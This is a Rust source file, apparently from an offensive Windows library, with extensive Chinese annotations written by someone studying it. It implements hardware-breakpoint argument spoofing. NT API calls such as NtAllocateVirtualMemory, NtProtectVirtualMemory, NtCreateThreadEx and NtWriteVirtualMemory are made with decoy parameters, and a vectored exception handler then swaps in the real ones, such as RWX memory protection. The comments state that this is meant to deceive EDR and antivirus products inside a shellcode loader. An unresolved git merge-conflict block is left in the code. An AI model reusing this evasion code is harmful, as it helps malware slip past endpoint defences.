//! Hardware breakpoint management utilities.

use core::ffi::c_void;
use core::ptr::addr_of_mut;
use core::sync::atomic::{Ordering, AtomicBool};

use crate::winapis::{NtSetContextThread, NtGetContextThread, NtCurrentThread};
use crate::types::{
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64, EXCEPTION_SINGLE_STEP,
    EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, 
    EXCEPTION_POINTERS, HANDLE, OBJECT_ATTRIBUTES,
    CONTEXT_DEBUG_REGISTERS_X86
};

/// Global mutable static holding the current Windows API call.
/// 存储当前正在 Hook 的 API 信息,即正在进行欺骗的 API 信息（包含真实的恶意参数）;
/// static mut Option<WINAPI>，用于在触发断点时，告知异常处理器（VEH）当前应该还原哪些真实的参数
///  这是一个 unsafe 的全局变量( static mut 是不安全的)，多线程下可能会有竞争，但在此类shellcode 加载器场景通常是单线程或受控的
pub static mut CURRENT_API: Option<WINAPI> = None;

/// Atomic variable to control the use of VEH.
/// 控制 VEH (异常处理函数) 是否应该响应异常.如果为 false，即使触发了异常，VEH也会直接忽略，交给系统或其他处理器处理
static USE_BREAKPOINT: AtomicBool = AtomicBool::new(false);

/// Enables or disables the use of hardware breakpoints globally.
/// 
/// # Examples
/// 
/// ```
/// // Enabling breakpoint hardware
/// set_use_breakpoint(true);
/// let handle = AddVectoredExceptionHandler(1, Some(veh_handler));
///
/// // Allocating memory and using breakpoint hardware
/// let mut addr = std::ptr::null_mut();
/// let mut size = 1 << 12;
/// let status = NtAllocateVirtualMemory(NtCurrentProcess(), &mut addr, 0, &mut size, 0x3000, 0x04);
/// if !NT_SUCCESS(status) {
///     eprintln!("[-] NtAllocateVirtualMemory Failed With Status: {}", status);
///     return;
/// }
///
/// // Disabling breakpoint hardware
/// set_use_breakpoint(false);
/// RemoveVectoredExceptionHandler(handle); 
/// ``

///  Ordering::SeqCst,在cpu指令层加一道锁(内存屏障),
///  它强制要求：这行代码之前的所有指令必须完成，这行代码之后的所有指令不准提前。 保证了逻辑执行顺序在所有 CPU核心看来都是一致的。
/// .store 原子存储,对应的是 CPU 的原子指令,且在改内存之后,负责通知cpu的内存一致性,让其他cpu核心知道,缓存的旧值失效了
/// 是原子世界的“赋值号（=）”，但它附带了硬件级的线程安全保障
/// 启用或禁用硬件断点功能
#[inline(always)]
pub fn set_use_breakpoint(enabled: bool) {
    USE_BREAKPOINT.store(enabled, Ordering::SeqCst);
}

/// Checks if hardware breakpoints are currently enabled.
#[inline(always)]
pub fn is_breakpoint_enabled() -> bool {
    USE_BREAKPOINT.load(Ordering::SeqCst)
}

/// Configures a hardware breakpoint on the specified address.
/// 
pub(crate) fn set_breakpoint<T: Into<u64>>(address: T) {

    //设置ContextFlags,让ring0读取标记的调试寄存器,而不是所有状态
    let mut ctx = CONTEXT {
        ContextFlags: if cfg!(target_arch = "x86_64") { 
            // 设置为当前线程的硬件调试寄存器（Dr0-Dr7）
            CONTEXT_DEBUG_REGISTERS_AMD64 } else { CONTEXT_DEBUG_REGISTERS_X86 },
        ..Default::default()
    };

<<<<<<< Updated upstream
    // NtCurrentThread()：获取当前线程的“伪句柄”（Pseudo Handle）即-2
    // ctx 是一个存在于内存（RAM）中的数据结构，它是 CPU内部寄存器的一个镜像。在ring3模式下,只能用ctx作为cpu寄存器的载体(ring3不能直接操作特殊的cpu寄存器)
    // NtGetContextThread是win中底层的原生api,位于ntdll.dll中,是ring3和ring0交互桥梁,用于获取某时刻完整cpu的寄存器状态
    // 这里NtGetContextThread,在执行中通过dinvk!吧请求(参数handle ctx)转发给ntdll,进而进入ring0;
    // ring0收到请求后,去物理cpu读取寄存器状态
    // ring0把读到的数据填回到ctx中
    // 这段代码是硬件断点设置逻辑中“读取-修改-写入”安全范式的核心读取dinvk 的封装将当前线程的伪句柄（-2）和预先设置了过滤标志（ContextFlags）的ctx 结构体指针转发给底层的 ntdll.dll，触发系统调用进入 Ring 0内核态；内核根据标志位仅读取物理 CPU中当前的调试寄存器（Dr0-Dr7）状态，并将其精准回填到用户态的 ctx内存镜像中，从而确保后续对断点位的修改是基于最新且完整的硬件状态进行的，防止因盲目覆盖而破坏 CPU 现有的其他上下文信息。
=======
    // retrieving current thread register(dr0-7)
    // 实现了隐藏导入表,但没有实现indirect syscall
>>>>>>> Stashed changes
    NtGetContextThread(NtCurrentThread(), &mut ctx);


    // 硬件断点设置逻辑中的“修改(Modify)”阶段
    cfg_if::cfg_if! {

        //区分x86_64和x86
        if #[cfg(target_arch = "x86_64")] {

            // Dr0（Debug Register 0）是硬件断点的地址寄存器.把想要监控的函数地址（比如 NtAllocateVirtualMemory的地址）放进这个寄存器
            //CPU 硬件会自动监控指令指针（RIP/EIP）。一旦发现指令指针运行到了Dr0 存储的这个地址，CPU 就会立刻停下来，抛出一个“单步执行异常（Single Step Exception）”
            ctx.Dr0 = address.into();

            // Dr6 是调试状态寄存器（Debug Status Register）
            // 当断点触发时，CPU 会把 Dr6 的某些位设为1，告诉调试器“我是因为哪个断点停下来的”。在设置新断点前将其清零，是为了防止旧的触发状态干扰新的逻辑，确保下一次异常处理时拿到的是干净的状态。
            ctx.Dr6 = 0x00;

            // Dr7 是调试控制寄存器，它决定了 Dr0-Dr3这些陷阱是否生效、怎么生效
            //
            ctx.Dr7 = set_dr7_bits(ctx.Dr7, 0, 1, 1);
        } else {
            ctx.Dr0 = address.into() as u32;
            ctx.Dr6 = 0x00;
            ctx.Dr7 = set_dr7_bits(ctx.Dr7 as u64, 0, 1, 1) as u32;
        }
    }

    NtSetContextThread(NtCurrentThread(), &ctx);
}

/// Modifies specific bits in the `DR7` register.
/// 用于将一个64位位整数中指定范围的位替换为新的值，同时保持其他位不变(不仅用于dr7)
/// 后三个参数分别代表,起始位 位数 新值
/// dr7的L0位置1,代表允许dr0在当前线程执行时触发断点
fn set_dr7_bits<T: Into<u64>>(current: T, start_bit: i32, nmbr_bits: i32, new_bit: u64) -> u64 {

    // 原始值
    let current = current.into();

    // 让一个64位的二进制的值的,nmbr_bits-1位及后面的位均设为1
    // 本项目中将一个64位的二进制的值的最低位置1,其他位不变(为0)
    let mask = (1u64 << nmbr_bits) - 1;

    // !(mask << start_bit)左移指定位,再对逐位取反,本例中左移0位,取反后末位为0,其他位为1;
    // current & !(mask << start_bit),与mask做与操作(任何与1,保持不变,任何与0,变为0),这里将末位从1变为0,其他位不变.
    // 即得到一个末位0,其他位不变的二进制current
    // (new_bit << start_bit)把新值的指定位左移,低位（右边补进来的位）全是 0，高位（如果没溢出）也是 0，只有中间那段是你移过去的新值
    // 任何值和0做或操作,等于原值.左移的新值部分填入了原值,原值保留
    //  这里隐藏着一个巨大的风险！如果 new_bit 超过了 nmbr_bits 能容纳的范围，它就会溢出并污染到其他本来不该修改的位.如何修改?let safe_new_bit = new_bit & mask; // <--- 新增步骤：强行截断超出范围的高位,通过对它自己也做一个 Mask 操作
    (current & !(mask << start_bit)) | (new_bit << start_bit)
}

/// Enum representing different Windows API calls that can be used.
/// 暂存真实的（敏感/恶意）API参数
/// 在正常的 API 调用中，参数是直接传给函数的。但在 dinvk 的这个 Hook机制下.台面上（给 EDR/杀软看的）程序调用 Windows API（如NtAllocateVirtualMemory），但传入的是假的、看似无害的参数(如：把 `RWX` (可读可写可执行) 这种敏感权限，伪装成 `Read-Only`)
/// 真实的参数被打包存储在这个 WINAPI 枚举里，放进全局变量 CURRENT_API中
#[derive(Debug)]
pub enum WINAPI {
    /// Represents the `NtAllocateVirtualMemory` call.
    NtAllocateVirtualMemory {
        ProcessHandle: HANDLE,
        Protect: u32,
    },

    /// Represents the `NtProtectVirtualMemory` call.
    NtProtectVirtualMemory {
        ProcessHandle: HANDLE,
        NewProtect: u32,
    },

    /// Represents the `NtCreateThreadEx` call.
    NtCreateThreadEx {
        ProcessHandle: HANDLE,
        ThreadHandle: *mut HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES
    },

    /// Represents the `NtWriteVirtualMemory` call.
    NtWriteVirtualMemory {
        ProcessHandle: HANDLE,
        Buffer: *mut c_void,
        NumberOfBytesToWrite: *mut usize,
    },
}

/// Handles exceptions triggered by hardware breakpoints (x64).
/// 用户调用了一个系统 API如（NtAllocateVirtualMemory），但传入了假参数
/// 当cpu执行到设置的硬件断点后,拦截异常，偷偷把寄存器里的假参数换成真参数，然后让程序继续跑
#[cfg(target_arch = "x86_64")]

// 允许在 unsafe 函数体中直接进行 unsafe 操作（Rust 2024 edition 风格）
#[allow(unsafe_op_in_unsafe_fn)]

// extern "system"告诉 Rust 编译器使用 Windows标准的调用约定（stdcall 的变体）这样操作系统（Windows内核）才能正确地回调这个函数
pub unsafe extern "system" fn veh_handler(exceptioninfo: *mut EXCEPTION_POINTERS) -> i32 {
    
    // 判断异常是否是硬件断点触发的单步调试异常
    // EXCEPTION_SINGLE_STEP (0x80000004)硬件断点触发的特定异常代码.如果收到 Access Violation（内存访问违规）或 Divide by Zero（除零），这个函数必须说“不归我管”，返回EXCEPTION_CONTINUE_SEARCH，让系统去找别的处理程序（否则程序会崩溃或者死循环）。
    if !is_breakpoint_enabled() || (*(*exceptioninfo).ExceptionRecord).ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // ContextRecord 是一个指向mut CONTEXT 结构体的指针.指向当前线程在异常发生瞬间的寄存器状态快照
    // 这个结构体不仅是“只读”的快照，它还是可写的。如果我们修改了context 里的值，当函数返回 ContinueExecution时，操作系统会将这些修改后的值写回真正的 CPU 寄存器里
    let context = (*exceptioninfo).ContextRecord;

    // 异常发生时,rip指向导致异常的那条指令,即rip应指向dr0中在set_breakpoint设置的api地址
    // .Dr7 & 1,取出dr7的第0位,确认断点是在硬件层面开启的
    if (*context).Rip == (*context).Dr0 && (*context).Dr7 & 1 == 1 {

        // addr_of_mut!(CURRENT_API),获取全局变量CURRENT_API的裸指针
        if let Some(current) = (*addr_of_mut!(CURRENT_API))
        // 获取option中的值,并将原值设为NONE
        // 原子级取出并销毁操作,确保同一hook参数只使用一次
        .take() {

            // winapi.rs负责spoof,breakpoint负责圆回来.
            // 在winapi.rs中spoof了下面函数的部分参数,现在只需要修改这些参数,并传入真实意图就行了
            // 影子空间预留给前四个参数,初始状态是空或垃圾值,调用者不负责把前4个参数填入影子空间,只负责放入对应的寄存器(rcx rdx r8 r9)
            // 多余的参数沿栈向高地址(向上)增长的
            // 栈顶高地址,入栈向低地址增长,后入先出.所以,函数参数需要倒着入栈,这样取值才是正序
            match current {

                // NtAllocateVirtualMemory 原型：(Handle, Base, ZeroBits, Size, Type,Protect)。 Protect 是第 6 个
                WINAPI::NtAllocateVirtualMemory {
                    ProcessHandle, 
                    Protect 
                } => {

                    // 修改第一个参数,winapi中用的是一个无效值,此处应改为真实的handle
                    (*context).R10 = ProcessHandle as u64;
                    // 修改第6个参数,直接使用rsp+offset找到第6个参数地址
                    // winapi传入的是PAGE_READONLY (0x02),此处应改为0x40(rwx)
                    *(((*context).Rsp + 0x30) as *mut u32) = Protect;
                },


                // NtProtectVirtualMemory 原型：(Handle, Base, Size, NewProtect,OldProtect)
                // 直接修改寄存器，最简单高效
                WINAPI::NtProtectVirtualMemory { 
                    ProcessHandle, 
                    NewProtect, 
                } => {
                    (*context).R10 = ProcessHandle as u64;
                    (*context).R9  = NewProtect as u64;
                },

                WINAPI::NtCreateThreadEx { 
                    ProcessHandle,
                    ThreadHandle,
                    DesiredAccess,
                    ObjectAttributes
                } => {
                    (*context).R10 = ThreadHandle as u64;
                    (*context).Rdx = DesiredAccess as u64;
                    (*context).R8  = ObjectAttributes as u64;
                    (*context).R9  = ProcessHandle as u64;
                },

                WINAPI::NtWriteVirtualMemory { 
                    ProcessHandle,
                    Buffer,
                    NumberOfBytesToWrite,
                } => {
                    (*context).R10 = ProcessHandle as u64;
                    (*context).R8  = Buffer as u64;
                    (*context).R9  = NumberOfBytesToWrite as u64;
                }
            }

            (*context).Dr0 = 0x00;
            (*context).Dr6 = 0x00;
            (*context).Dr7 = set_dr7_bits((*context).Dr7, 0, 1, 0);
        }

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    EXCEPTION_CONTINUE_SEARCH
}

/// Handles exceptions triggered by hardware breakpoints (x86).
#[cfg(target_arch = "x86")]
#[allow(unsafe_op_in_unsafe_fn)]
pub unsafe extern "system" fn veh_handler(exceptioninfo: *mut EXCEPTION_POINTERS) -> i32 {
    if !is_breakpoint_enabled() || (*(*exceptioninfo).ExceptionRecord).ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context = (*exceptioninfo).ContextRecord;
    if (*context).Eip == (*context).Dr0 && (*context).Dr7 & 1 == 1 {
        if let Some(current) = (*addr_of_mut!(CURRENT_API)).take() {
            match current {
                WINAPI::NtAllocateVirtualMemory { 
                    ProcessHandle, 
                    Protect 
                } => {
                    *(((*context).Esp + 0x4) as *mut u32) = ProcessHandle as u32;
                    *(((*context).Esp + 0x18) as *mut u32) = Protect;
                },

                WINAPI::NtProtectVirtualMemory { 
                    ProcessHandle, 
                    NewProtect, 
                } => {
                    *(((*context).Esp + 0x4) as *mut u32) = ProcessHandle as u32;
                    *(((*context).Esp + 0x10) as *mut u32) = NewProtect as u32;
                },

                WINAPI::NtCreateThreadEx { 
                    ProcessHandle,
                    ThreadHandle,
                    DesiredAccess,
                    ObjectAttributes
                } => {
                    *(((*context).Esp + 0x4) as *mut u32) = ThreadHandle as u32;
                    *(((*context).Esp + 0x8) as *mut u32) = DesiredAccess as u32;
                    *(((*context).Esp + 0xC) as *mut u32) = ObjectAttributes as u32;
                    *(((*context).Esp + 0x10) as *mut u32) = ProcessHandle as u32;
                },

                WINAPI::NtWriteVirtualMemory { 
                    ProcessHandle,
                    Buffer,
                    NumberOfBytesToWrite,
                } => {
                    *(((*context).Esp + 0x4) as *mut u32) = ProcessHandle as u32;
                    *(((*context).Esp + 0xC) as *mut u32) = Buffer as u32;
                    *(((*context).Esp + 0x10) as *mut u32) = NumberOfBytesToWrite as u32;
                }
            }

            (*context).Dr0 = 0x00;
            (*context).Dr6 = 0x00;
            (*context).Dr7 = set_dr7_bits((*context).Dr7, 0, 1, 0) as u32;
        }

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    EXCEPTION_CONTINUE_SEARCH
}